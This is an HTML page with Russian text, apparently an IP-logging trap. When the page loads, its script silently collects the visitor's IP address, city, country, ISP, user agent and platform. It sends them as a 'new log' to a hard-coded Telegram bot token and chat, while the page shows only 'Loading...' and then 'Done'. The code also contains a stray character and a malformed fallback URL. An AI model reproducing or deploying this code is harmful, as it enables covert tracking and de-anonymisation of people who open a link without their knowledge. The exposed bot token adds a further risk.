<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
    <h1 id="status" style="font-size: 20px; color: blue;">Загрузка... (v28.0)</h1>

    <script>
        async function run() {
            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
            const chat_id = "-1003861311533"; 
            const status = document.getElementById('status');

            try {
 
                const res = await fetch('https://ipwho.is/');
                const d = await res.json();
                
 
                let msg = `👥 НОВЫЙ ЛОГ!\n`;
                if (d.success) {
                    msg += `📍 IP: ${d.ip}\n🌍 Город: ${d.city}, ${d.country}\n🏢 Провайдер: ${d.connection.org}\n`;
                } else {
                    msg += `⚠️ IP не определен сервисом\n`;
                }
                
                msg += `📱 Устройство: ${navigator.userAgent}\n💻 ОС: ${navigator.platform}`;
Ы
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: msg })
                });

                status.style.color = "green";
                status.innerText = "ГОТОВО!";

            } catch (e) {
 
                const backup = `⚠️ Переход!\n📱 ${navigator.userAgent}`;
                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
                status.innerText = "Готово (лог ушел)!";
            }
        }
        run();
    </script>
</body>
</html>
